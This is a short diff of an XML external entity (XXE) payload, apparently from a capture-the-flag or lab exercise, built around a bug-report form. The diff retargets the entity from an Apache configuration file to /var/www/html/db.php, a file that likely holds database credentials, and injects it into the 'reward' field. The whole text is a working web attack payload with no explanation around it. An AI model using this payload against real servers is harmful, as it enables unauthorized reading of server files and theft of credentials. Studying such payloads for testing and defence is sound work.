@@ -1,7 +1,7 @@
 <?xml  version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/httpd/conf/httpd.conf"> ]>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/db.php"> ]>
 		<bugreport>
-		<title>&xxe;</title>
+		<title></title>
 		<cwe>e</cwe>
 		<cvss>e</cvss>
 		<reward>&xxe;</reward>
